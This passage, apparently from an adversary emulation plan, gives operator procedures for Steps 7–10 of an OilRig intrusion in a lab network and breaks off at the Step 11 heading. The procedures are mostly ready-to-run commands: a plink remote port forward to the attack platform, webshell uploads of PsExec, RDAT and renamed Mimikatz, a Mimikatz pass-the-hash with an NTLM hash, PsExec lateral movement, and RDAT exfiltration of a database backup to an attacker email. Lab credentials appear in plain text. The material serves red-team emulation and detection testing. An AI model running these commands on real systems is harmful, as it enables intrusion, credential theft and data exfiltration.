+<li>Credential dumping: <a href="https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/" class="outbound" target="_blank"><span>https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+</ul>
+<br>
+<doc-anchor-target id="step-7---lateral-movement-to-ews-via-rdp-tunnel">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-7---lateral-movement-to-ews-via-rdp-tunnel">#</doc-anchor-trigger>
+        <span>Step 7 - Lateral Movement to EWS via RDP Tunnel</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Step 7 emulates OilRig moving laterally to <code v-pre>WATERFALLS (10.1.0.6)</code>. This is
+accomplished with a remote port forward using the plink command line tool
+(downloaded by <code v-pre>SystemFailureReporter.exe</code>). OilRig conducts a remote port forward
+from <code v-pre>THEBLOCK (10.1.0.5)</code> to the attacking machine to allow RDP access through
+port 3389 as user <code v-pre>gosta</code>.</p>
+<hr>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p>Download plink to <code v-pre>THEBLOCK (10.1.0.5)</code> using SideTwist and start plink tunnel
+to gain RDP access to <code v-pre>WATERFALLS (10.1.0.6)</code> from the Linux Attack Platform.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '102 c:\users\public\downloads\plink.exe|plink.exe'</code></pre>
+</doc-codeblock></div>
+<p>Execute the remote port forward command using SideTwist. Note: this SideTwist
+process will persist as long as the tunnel is open and as such will need to be
+closed after the activity is done. SideTwist will continue to execute
+via schtask so other commands can be issued to the implant if needed.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '101 echo y | c:\users\public\downloads\plink.exe -ssh -N -R 192.168.0.4:13389:10.1.0.6:3389 -l saka -pw &quot;$ceKa#zU$Uc4^9yZ&quot; 192.168.0.4'</code></pre>
+</doc-codeblock></div>
+<p>Ensure that the tunnel is open and listening on port 13389 on Linux Attack Platform.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">netstat -antulp | grep 13389</code></pre>
+</doc-codeblock></div>
+<p>You should see a result that looks like the following:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">tcp        0      0 127.0.0.1:13389         0.0.0.0:*               LISTEN</code></pre>
+</doc-codeblock></div>
+<p>RDP to <code v-pre>WATERFALLS (10.1.0.6)</code> as user Gosta from Linux Attack Platform using the SSH
+tunnel.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">xfreerdp /u:'boombox\gosta' /p:'d0ntGoCH4$ingW8trfalls' /v:localhost:13389</code></pre>
+</doc-codeblock></div>
+<br>
+<doc-anchor-target id="source-code">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>Plink command line tool: <a href="../resources/plink/">Plink</a></li>
+</ul>
+<br>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>Plink: <a href="https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/" class="outbound" target="_blank"><span>https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+<li>SSH: <a href="https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/" class="outbound" target="_blank"><span>https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+<li>RDP: <a href="https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf" class="outbound" target="_blank"><span>https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+<li>RDP: <a href="https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/" class="outbound" target="_blank"><span>https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+</ul>
+<br>
+<doc-anchor-target id="step-8---lateral-movement-to-the-sql-server">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-8---lateral-movement-to-the-sql-server">#</doc-anchor-trigger>
+        <span>Step 8 - Lateral Movement to the SQL Server</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Step 8 emulates OilRig using the credentials collected for the user <code v-pre>tous</code> in
+the previous step to move laterally to the SQL server.</p>
+<p>First, the webshell is used to download PsExec, RDAT, and a newly named
+Mimikatz to disk. Through the tunneled RDP, an elevated Command Prompt is opened
+and, using the NTLM hash for <code v-pre>tous</code> from the credential dump, Mimikatz pass the
+hash is executed to spawn a second shell as <code v-pre>tous</code> on <code v-pre>WATERFALLS (10.1.0.6)</code>.
+As <code v-pre>tous</code>, RDAT is copied over to <code v-pre>ENDOFROAD (10.1.0.7)</code>, then PsExec is executed
+to get a shell on <code v-pre>ENDOFROAD (10.1.0.7)</code></p>
+<hr>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p>Download psexec to <code v-pre>WATERFALLS (10.1.0.6)</code> as <code v-pre>C:\Windows\System32\ps.exe</code></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># OilRig has downloaded PsExec as ps.exe
+
+curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST -F &quot;upl=f1&quot; -F 'sav=C:\Windows\System32' -F &quot;vir=false&quot; -F &quot;nen=ps.exe&quot; -F 'f1=@PsExec.exe' https://10.1.0.6/ews/contact.aspx</code></pre>
+</doc-codeblock></div>
+<p>Download RDAT to <code v-pre>WATERFALLS (10.1.0.6)</code> as <code v-pre>Nt.dat</code></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># OilRig has saved RDAT to disk as Nt.dat
+
+curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST -F &quot;upl=f1&quot; -F 'sav=C:\Windows\Temp' -F &quot;vir=false&quot; -F &quot;nen=Nt.dat&quot; -F 'f1=@RDAT.exe' https://10.1.0.6/ews/contact.aspx</code></pre>
+</doc-codeblock></div>
+<p>Redownload Mimikatz to <code v-pre>WATERFALLS (10.1.0.6)</code> as <code v-pre>mom64.exe</code></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># OilRig has saved Mimikatz to disk at mom64.exe
+
+curl --http1.1 --ntlm -u 'boombox\gosta:d0ntGoCH4$ingW8trfalls' -k -X POST -F &quot;upl=f1&quot; -F 'sav=C:\Windows\System32' -F &quot;vir=false&quot; -F &quot;nen=mom64.exe&quot; -F 'f1=@m64.exe' https://10.1.0.6/ews/contact.aspx</code></pre>
+</doc-codeblock></div>
+<p>In the RDP to <code v-pre>WATERFALLS (10.1.0.6)</code>, open a new Command Prompt as
+Administrator, click yes to the UAC prompt, and execute Mimikatz PTH for <code v-pre>tous</code></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># OilRig has used Mimikatz
+
+C:\Windows\System32\mom64.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:tous /domain:BOOMBOX /ntlm:9b7ff4cc0878bee9f099a4a7dc7227c3&quot; &quot;exit&quot;</code></pre>
+</doc-codeblock></div>
+<p>In the new Command Prompt spawned by the Mimikatz pass the hash, copy RDAT to
+<code v-pre>ENDOFROAD (10.1.0.7)</code></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># OilRig has saved RDAT to disk as C:\Programdata\Nt.dat before moving and renaming it to C:\Programdata\Vmware\VMware.exe
+
+copy C:\Windows\Temp\Nt.dat \\10.1.0.7\C$\ProgramData\</code></pre>
+</doc-codeblock></div>
+<p>In the new Command Prompt spawned by Mimikatz pass the hash, PsExec to the SQL
+server <code v-pre>ENDOFROAD (10.1.0.7)</code></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># OilRig has used PsExec [11]
+
+C:\Windows\System32\ps.exe \\10.1.0.7 cmd.exe</code></pre>
+</doc-codeblock></div>
+<br>
+<doc-anchor-target id="source-code">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x2757;</span> <strong>NB</strong>: Once again, TwoFace (contact.aspx) refers to the &quot;downloads&quot; from this section of the emulation procedure as &quot;Abritrary Folder Upload(s)&quot; in the source code.</p>
+<ul>
+<li>TwoFace Webshell download file to victim: <a href="../resources/twoface/contact.aspx#L58-L115/">contact.aspx#L58-L115</a></li>
+</ul>
+<br>
+<ul>
+<li>RDAT backdoor: <a href="../resources/rdat/">RDAT</a></li>
+</ul>
+<br>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>RDAT: <a href="https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/" class="outbound" target="_blank"><span>https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+<li>PSExec: <a href="https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/" class="outbound" target="_blank"><span>https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+<li>Mimikatz: <a href="https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/" class="outbound" target="_blank"><span>https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+<li>Mimikatz: <a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments" class="outbound" target="_blank"><span>https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+</ul>
+<br>
+<doc-anchor-target id="step-9---sql-server-discovery">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-9---sql-server-discovery">#</doc-anchor-trigger>
+        <span>Step 9 - SQL Server Discovery</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Step 9 emulates OilRig using the command prompt (in the context of <code v-pre>tous</code>) created
+by Mimikatz pass the hash and PSExec to perform discovery of the database backup
+files on the SQL server <code v-pre>ENDOFROAD (10.1.0.7)</code>.</p>
+<hr>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p>Discover version of SQL server</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">dir &quot;C:\Program Files\Microsoft SQL Server\&quot;</code></pre>
+</doc-codeblock></div>
+<p>Discover SQL server database backup files</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">dir &quot;C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Backup\&quot;</code></pre>
+</doc-codeblock></div>
+<br>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>Discovery: <a href="https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/" class="outbound" target="_blank"><span>https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+<li>RDAT/Exfiltration: <a href="https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/" class="outbound" target="_blank"><span>https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+</ul>
+<br>
+<doc-anchor-target id="step-10---collection-and-exfiltration-of-database-files">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-10---collection-and-exfiltration-of-database-files">#</doc-anchor-trigger>
+        <span>Step 10 - Collection and Exfiltration of Database Files</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Step 10 emulates OilRig collecting and exfiltrating backups of the database files
+via the EWS API.</p>
+<p>OilRig first creates a new directory <code v-pre>C:\Programdata\Vmware</code> in which to stage
+the collected data. RDAT is then moved to the new directory and renamed to
+<code v-pre>VMware.exe</code>.</p>
+<p>The newly named <code v-pre>VMware.exe</code> is used to read the data from sitedata_db.bak, split
+the data into 20000 byte chunks, and exfiltrate the chunks via EWS API to an
+attacker controlled email (<code v-pre>sistan@shirinfarhad.com</code>). The stolen data is
+obfuscated within BMP images attached to the emails sent to <code v-pre>sistan@shirinfarhad.com</code>.</p>
+<hr>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p>Create directory C:\Programdata\Vmware</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># OilRig has saved RDAT to disk as C:\Programdata\Nt.dat before moving and renaming it to C:\Programdata\Vmware\VMware.exe
+
+mkdir C:\Programdata\Vmware</code></pre>
+</doc-codeblock></div>
+<p>Move and rename RDAT as C:\Programdata\Vmware\VMware.exe</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># OilRig has saved RDAT to disk as C:\Programdata\Nt.dat before moving and renaming it to C:\Programdata\Vmware\VMware.exe
+
+move C:\Programdata\Nt.dat C:\Programdata\Vmware\VMware.exe</code></pre>
+</doc-codeblock></div>
+<p>Change directory into the SQL backup directory (PsExec has a character limit)</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">cd &quot;C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Backup\&quot;</code></pre>
+</doc-codeblock></div>
+<p>Execute RDAT to pull back target database backup file.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># OilRig has used EWS APIs to exfiltrate data to an adversary controlled email
+
+C:\ProgramData\Vmware\VMware.exe --path=&quot;sitedata_db.bak&quot; --to=&quot;sistan@shirinfarhad.com&quot; --from=&quot;gosta@boom.box&quot; --server=&quot;10.1.0.6&quot; --password='d0ntGoCH4$ingW8trfalls' --chunksize=&quot;200000&quot;</code></pre>
+</doc-codeblock></div>
+<br>
+<doc-anchor-target id="source-code">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>RDAT chunking: <a href="../resources/rdat/program.cs#L104-L109">Program.cs#L104-L109</a></li>
+<li>RDAT appending file bytes to guest.bmp: <a href="../resources/rdat/program.cs#L77-L85">Program.cs#L117-L129</a></li>
+<li>RDAT leverages EWS API to exfil chunks: <a href="../resources/rdat/program.cs#L43-L75">Program.cs#L95-L115</a></li>
+</ul>
+<br>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>RDAT/Exfiltration: <a href="https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/" class="outbound" target="_blank"><span>https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+<li>TwoFace webshell: <a href="https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/" class="outbound" target="_blank"><span>https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+<li>C2 Communications: <a href="https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/" class="outbound" target="_blank"><span>https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
+</ul>
+<br>
+<doc-anchor-target id="step-11---cleanup">
+    <h2>
